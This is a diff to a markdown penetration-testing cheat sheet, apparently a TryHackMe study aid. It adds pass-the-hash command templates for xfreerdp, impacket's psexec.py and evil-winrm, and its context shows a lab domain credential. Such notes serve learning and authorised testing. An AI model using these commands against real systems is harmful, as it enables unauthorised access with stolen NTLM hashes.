@@ -18,6 +18,8 @@
    * [Execute Binary as Owner](#execute-binary-as-owner)
    * [Unshadow](#unshadow)
    * [xfreerdp](#xfreerdp)
+   * [Connect via psexec using Pass the Hash](connect-via-psexec-using-pass-the-hash)
+   * [Connect to WinRM using PtH](connect-to-wintm-using-pth)
 
 
 
@@ -281,6 +283,20 @@ xfreerdp /d:[DOMAIN] /u:[USERNAME]  /p:[PASSWORD] /v:[SERVER-NAME]
 Example:
 ```
 xfreerdp /d:za.tryhackme.com /u:joel.pearce  /p:E3IIDNiiT96 /v:thmjmp1.za.tryhackme.com
+```
+Connect to RDP using Pass the Hash (PtH):
+```
+xfreerdp /v:[TARGET-IP] /u:[DOMAIN]\\[USERNAME] /pth:[NTLM-HASH]
+```
+
+### Connect via psexec using Pass the Hash
+```
+psexec.py -hashes [NTLM-HASH] [DOMAIN]/[USERNAME]@[TARGET-IP]
+```
+
+### Connect to WinRM using PtH
+```
+evil-winrm -i TARGET-IP -u [USERNAME] -H [NTLM-HASH]
 ```
 
 *********************************************************************************
